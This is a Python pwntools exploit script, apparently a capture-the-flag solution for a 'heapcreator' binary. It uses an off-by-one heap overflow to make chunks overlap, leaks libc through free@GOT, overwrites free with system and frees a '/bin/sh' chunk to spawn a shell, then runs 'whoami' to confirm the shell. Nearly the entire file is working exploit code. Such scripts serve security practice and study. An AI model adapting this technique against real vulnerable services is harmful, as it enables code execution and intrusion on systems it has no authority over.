#!/usr/bin/env python
# coding=utf-8
# author: thinkycx
# date: 2018-10-31
from pwn import *
import sys

context.local(arch='amd64', os='linux')

def create(size,content):
    io.recvuntil(":")
    io.sendline("1")
    io.recvuntil(":")
    io.sendline(str(size))
    io.recvuntil(":")
    io.sendline(content)

def edit(idx,content):
    io.recvuntil(":")
    io.sendline("2")
    io.recvuntil(":")
    io.sendline(str(idx))
    io.recvuntil(":")
    io.sendline(content)

def show(idx):
    io.recvuntil(":")
    io.sendline("3")
    io.recvuntil(":")
    io.sendline(str(idx))

def delete(idx):
    io.recvuntil(":")
    io.sendline("4")
    io.recvuntil(":")
    io.sendline(str(idx))


def pwn(io):
    if local&debug: gdb.attach(io,'break *0x400db1') # main atoi
    log.info("[1] create chunk,  overwrite chunk2's size and free chunk2, get 2 fastbin chunks")
    create(0x18, "") # 0 1 chunk0 
    create(0x10, "") # 0 1 2 3   chunk1
    create(0x10, "") # 0 1 2 3 4 5 6 chunk2

    payload_overflow = "a"*0x10 + p64(0xdeadbeafdeadbeaf) + "\x41"
    edit(0, payload_overflow)
    delete(1) # get fastbin chunk in  0x40

    log.info("[2] get 0x40 chunk, chunk overlap! overwrite free@got to content ptr")
    payload_got = p64(0x0)*2 + p64(0) + p64(0x21) + p64(0x8)  + p64(elf.got['free']) 
    create(0x38, payload_got) # chunk3
    show(1)

    io.recvuntil("Content : ")
    libc.address = u64(io.recv(6)+"\x00\x00") - libc.symbols['free']
    log.success("libc.address: %#x", libc.address)

    log.info("system addr: %#x", libc.symbols['system'])

    log.info("[3] write system addr to free@got")
    edit(1, p64(libc.symbols['system']))

    create(0x18, "/bin/sh\x00")
    # gdb.attach(io)
    delete(3)


if __name__ == '__main__':
    global io, elf, libc, debug
    local, debug = 0, 0
    # context.log_level = 'debug'
    filename = './heapcreator'
    port = sys.argv[1]
    elf = ELF(filename)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    if local:
        io = process(filename)
        # context.terminal = ['tmux', '-x', 'sh', '-c']
        # context.terminal = ['tmux', 'splitw', '-h' ]
    else:
        io = remote('127.0.0.1', port)
    pwn(io)
    # io.sendline('echo getshell')
    #print io.recv()
    #recv = io.recvuntil("getshell")
    # print "----",recv
    #if recv:

    io.interactive()
    io.sendline("whoami")
    recv = io.recv()
    print recv
    if recv:
        print "getshell!"
    else:
        print "cannot get shell!"
    #else:
    #    log.warn("cannot get shell!\n")

